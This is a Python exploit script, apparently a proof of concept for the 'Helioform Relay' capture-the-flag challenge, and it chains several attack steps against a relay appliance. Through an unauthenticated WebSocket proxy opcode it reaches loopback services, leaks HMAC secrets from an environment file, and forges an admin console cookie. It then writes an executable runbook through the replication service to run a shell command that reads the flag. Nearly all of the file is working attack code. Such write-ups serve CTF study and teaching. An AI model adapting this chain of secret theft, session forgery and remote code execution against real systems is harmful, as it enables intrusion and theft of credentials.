#!/usr/bin/env python3
"""
Helioform Relay 4.2 (CSCTF 2026, Web / protocol chaining)

Walks the appliance end-to-end: the unauthenticated legacy agent WebSocket
(hsp.raw.1) exposes a DIAL opcode (0x10) to loopback; via it we pull a ticket
from catalogd (7710), export the provisioner dotenv from provd (7711) to leak
the console and replication HMAC keys, forge a factory console session, write
a runbook through the replication service (7713) using an absolute stream id,
and have it executed as the relay user with the flag printed on /console/automation.

Usage: python3 helioform.py <base_url> [peer_name]

The CTF instance is retired; this PoC documents the exploit path.
"""
import sys
import os
import re
import time
import json
import hmac
import socket
import hashlib
import base64
import struct
import http.client
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
PEER = sys.argv[2] if len(sys.argv) > 2 else "relay-collector"  # only peer accepted, per trace

_p = urllib.parse.urlparse(BASE)
HOST = _p.hostname or "<instance>"
PORT = _p.port or (443 if _p.scheme == "https" else 80)
USE_TLS = _p.scheme == "https"
RUNBOOK_PATH = "/var/lib/helioform/runbooks/rb1"  # absolute stream id (the vulnerability)
ENV_PATH = "/etc/helioform/relay.env"


def hsp_frame(opcode: int, body: bytes, flags: int = 0) -> bytes:
    return b"HSP1" + struct.pack("<HHI", opcode, flags, len(body)) + body


def hsp_read(sock: socket.socket) -> tuple:
    hdr = b""
    while len(hdr) < 12:
        chunk = sock.recv(12 - len(hdr))
        if not chunk:
            raise ConnectionError("eof reading HSP header")
        hdr += chunk
    magic, opcode, flags, length = struct.unpack("<4sHHI", hdr)
    assert magic == b"HSP1", f"bad magic {magic!r}"
    body = b""
    while len(body) < length:
        chunk = sock.recv(length - len(body))
        if not chunk:
            raise ConnectionError("eof reading HSP body")
        body += chunk
    return opcode, flags, body


def raw_ws_connect() -> socket.socket:
    """Open the legacy agent WebSocket (/mesh, hsp.raw.1); after 101 the
    socket is a raw HSP byte stream (no WS framing)."""
    sock = socket.create_connection((HOST, PORT), timeout=15)
    if USE_TLS:
        import ssl
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET /mesh HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           "Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
           "Sec-WebSocket-Protocol: hsp.raw.1\r\n\r\n")
    sock.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += sock.recv(4096)
    status = resp.split(b"\r\n", 1)[0].decode()
    if "101" not in status:
        raise RuntimeError(f"websocket upgrade failed: {status}")
    return sock


def dial(port: int) -> socket.socket:
    """DIAL 127.0.0.1:<port> through the legacy agent proxy; the socket is
    spliced to that loopback service. Bytes sent immediately after the ack
    are dropped, so wait before writing."""
    sock = raw_ws_connect()
    sock.sendall(hsp_frame(0x01, b"hello"))  # HELLO, body free-form
    hsp_read(sock)  # hsp-edge banner (raw text line, best-effort read)
    sock.sendall(hsp_frame(0x10, f"127.0.0.1:{port}".encode()))
    ack = sock.recv(64)
    if b"ok splice" not in ack:
        raise RuntimeError(f"dial {port} failed: {ack!r}")
    time.sleep(1.0)
    return sock


def hsp_text(sock: socket.socket, opcode: int, body: bytes) -> str:
    sock.sendall(hsp_frame(opcode, body))
    _, _, resp = hsp_read(sock)
    return resp.decode("utf-8", errors="replace")


def get_ticket() -> str:
    sock = dial(7710)  # catalogd
    banner = hsp_text(sock, 0x01, b"")
    nonce = re.search(r"nonce=([0-9a-fA-F]+)", banner).group(1)
    out = hsp_text(sock, 0x20, nonce.encode())  # ticket_opcode=0x20, body=nonce
    sock.close()
    return re.search(r"ticket=(\S+)", out).group(1)


def export_dotenv(ticket: str, path: str) -> str:
    sock = dial(7711)  # provd (dotenv broker); export_opcode=0x30, fields ticket,path
    hsp_text(sock, 0x01, b"")
    body = f"ticket={ticket}\npath={path}".encode()
    out = hsp_text(sock, 0x30, body)
    sock.close()
    return out


def forge_console_cookie(mac_key: str, iss: str, aud: str) -> str:
    payload = {"iss": iss, "aud": aud, "role": "admin",
               "exp": int(time.time()) + 3600}
    raw = json.dumps(payload, separators=(",", ":")).encode()
    b64 = base64.urlsafe_b64encode(raw).rstrip(b"=")
    mac = hmac.new(mac_key.encode(), b64, hashlib.sha256).hexdigest()  # key used as literal string
    return b64.decode() + "." + mac


def http_get(path: str, cookie: str = None) -> str:
    conn_cls = http.client.HTTPSConnection if USE_TLS else http.client.HTTPConnection
    conn = conn_cls(HOST, PORT, timeout=15)
    headers = {"Cookie": f"console={cookie}"} if cookie else {}
    conn.request("GET", path, headers=headers)
    body = conn.getresponse().read().decode("utf-8", errors="replace")
    conn.close()
    return body


def recordd_status(ticket: str) -> dict:
    sock = dial(7712)  # recordd; status_opcode=0x40, fields ticket
    hsp_text(sock, 0x01, b"")
    out = hsp_text(sock, 0x40, f"ticket={ticket}".encode())
    sock.close()
    fields = dict(re.findall(r"(\w+)=(\S+)", out))
    return {"epoch": int(fields["epoch"]), "tip": fields["tip"],
            "bind": fields["bind"], "repl_port": int(fields.get("repl_port", "7713"))}


def repl_hello(sock: socket.socket, key: str, peer: str, epoch: int, tip_hex: str) -> None:
    tip = bytes.fromhex(tip_hex)
    mac = hmac.new(key.encode(),
                   f"hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}".encode(),
                   hashlib.sha256).digest()
    body = struct.pack("<H", len(peer)) + peer.encode() + struct.pack("<I", epoch) + tip + mac
    sock.sendall(hsp_frame(0x11, body))
    _, _, resp = hsp_read(sock)
    print("[*] repl hello:", resp.decode("utf-8", errors="replace"))


def repl_commit(sock: socket.socket, key: str, stream_id: str, epoch: int,
                tip_hex: str, bind_hex: str, body: bytes) -> None:
    tip = bytes.fromhex(tip_hex)
    bind = bytes.fromhex(bind_hex)
    body_sha = hashlib.sha256(body).hexdigest()
    mac = hmac.new(key.encode(),
                   f"hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{body_sha}".encode(),
                   hashlib.sha256).digest()
    blob = (struct.pack("<H", len(stream_id)) + stream_id.encode()
            + b"\x01"  # mode 0x01: replace resolved stream file with body
            + struct.pack("<I", epoch) + tip + bind
            + struct.pack("<I", len(body)) + body + mac)
    sock.sendall(hsp_frame(0x17, blob))  # commit opcode 0x17 (not 0x12)
    _, _, resp = hsp_read(sock)
    print("[*] repl commit:", resp.decode("utf-8", errors="replace"))


def main() -> None:
    ticket = get_ticket()
    print(f"[*] catalogd ticket: {ticket}")

    env = export_dotenv(ticket, ENV_PATH)
    print("[*] provd export:\n", env)
    env_vals = dict(re.findall(r"(\w+)=(\S*)", env))
    console_key = env_vals["CONSOLE_MAC_KEY"]
    repl_key = env_vals["REPLICATION_MAC_KEY"]
    iss = env_vals.get("CONSOLE_ISS", "helioform-factory")
    aud = env_vals.get("CONSOLE_AUD", "relay-console")

    cookie = forge_console_cookie(console_key, iss, aud)
    print("[*] /console/trace (forged session):\n", http_get("/console/trace", cookie))

    # Each commit needs a fresh status (new epoch/tip/bind) and a fresh hello.
    st = recordd_status(ticket)
    print(f"[*] recordd status: {st}")
    repl = dial(st["repl_port"])
    repl_hello(repl, repl_key, PEER, st["epoch"], st["tip"])
    runbook = ('HSP-RUNBOOK\nimport os\n'
               'print(os.popen("cat /flag").read())\n').encode()
    repl_commit(repl, repl_key, RUNBOOK_PATH, st["epoch"], st["tip"], st["bind"], runbook)
    repl.close()

    print("[*] /console/automation (runbook output):\n",
          http_get("/console/automation", cookie))


if __name__ == "__main__":
    main()
